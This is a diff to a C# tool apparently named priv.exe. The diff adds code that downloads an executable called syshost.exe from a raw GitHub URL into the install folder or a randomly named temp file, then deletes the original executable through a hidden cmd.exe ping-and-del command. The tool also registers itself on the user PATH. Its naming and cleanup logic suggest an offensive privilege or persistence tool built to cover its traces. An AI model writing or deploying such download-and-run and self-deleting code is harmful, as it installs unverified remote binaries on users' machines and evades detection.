@@ -25,6 +25,7 @@
 
 using System;
 using System.IO;
+using System.Net;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Threading.Tasks;
@@ -317,17 +318,64 @@ if($r-eq 0){
         Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                      "priv");
 
+    const string BaseUrl = "https://raw.githubusercontent.com/Dylanthedabber/EasyPlasma/main/";
+
+    static bool Download(string filename, string destPath)
+    {
+        try {
+            Console.WriteLine($"[*] Downloading {filename}...");
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+            using (var wc = new WebClient())
+                wc.DownloadFile(BaseUrl + filename, destPath);
+            Console.WriteLine($"[+] Downloaded {filename}");
+            return true;
+        } catch (Exception ex) {
+            Console.WriteLine($"[-] Download failed: {ex.Message}");
+            return false;
+        }
+    }
+
+    /* Ensure syshost.exe is available, downloading from GitHub if needed */
+    static string ResolveSyshost(string preferDir)
+    {
+        string local = Path.Combine(preferDir, "syshost.exe");
+        if (File.Exists(local)) return local;
+        string installed = Path.Combine(InstallDir, "syshost.exe");
+        if (File.Exists(installed)) return installed;
+        /* Not found anywhere - download to temp */
+        string tmp = Path.Combine(Path.GetTempPath(), "syshost_" + Guid.NewGuid().ToString("N").Substring(0,6) + ".exe");
+        return Download("syshost.exe", tmp) ? tmp : null;
+    }
+
     static void Install()
     {
         string src = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
         string srcDir = Path.GetDirectoryName(src);
         Directory.CreateDirectory(InstallDir);
 
-        /* Copy priv.exe and syshost.exe */
-        File.Copy(src, Path.Combine(InstallDir,"priv.exe"), true);
-        string sysh = Path.Combine(srcDir,"syshost.exe");
-        if (File.Exists(sysh))
-            File.Copy(sysh, Path.Combine(InstallDir,"syshost.exe"), true);
+        /* Copy priv.exe to install dir */
+        string privDest = Path.Combine(InstallDir, "priv.exe");
+        File.Copy(src, privDest, true);
+
+        /* syshost.exe: use local copy if present, otherwise download from GitHub */
+        string syshostDest = Path.Combine(InstallDir, "syshost.exe");
+        string syshLocal = Path.Combine(srcDir, "syshost.exe");
+        if (File.Exists(syshLocal))
+            File.Copy(syshLocal, syshostDest, true);
+        else
+            Download("syshost.exe", syshostDest);
+
+        /* Remove source files from original location (only if we're not already in InstallDir) */
+        if (!string.Equals(srcDir, InstallDir, StringComparison.OrdinalIgnoreCase)) {
+            try { if (File.Exists(syshLocal)) File.Delete(syshLocal); } catch {}
+            try {
+                /* Self-delete the source priv.exe via cmd /c del after we exit */
+                string delCmd = $"/c ping -n 2 127.0.0.1 >nul & del /F /Q \"{src}\"";
+                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(
+                    "cmd.exe", delCmd){CreateNoWindow=true, UseShellExecute=false});
+            } catch {}
+            Console.WriteLine("[+] Cleaned up source files");
+        }
 
         /* Add to user PATH */
         string curPath = Registry.CurrentUser.OpenSubKey(@"Environment")
@@ -421,11 +469,9 @@ if($r-eq 0){
 
         string self = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
         string selfDir = Path.GetDirectoryName(self);
-        string syshostPath = Path.Combine(selfDir, "syshost.exe");
-        if (!File.Exists(syshostPath) && Directory.Exists(InstallDir))
-            syshostPath = Path.Combine(InstallDir, "syshost.exe");
-        if (!File.Exists(syshostPath)) {
-            Console.WriteLine("[-] syshost.exe not found next to priv.exe");
+        string syshostPath = ResolveSyshost(selfDir);
+        if (syshostPath == null) {
+            Console.WriteLine("[-] syshost.exe not found and download failed");
             return;
         }
 
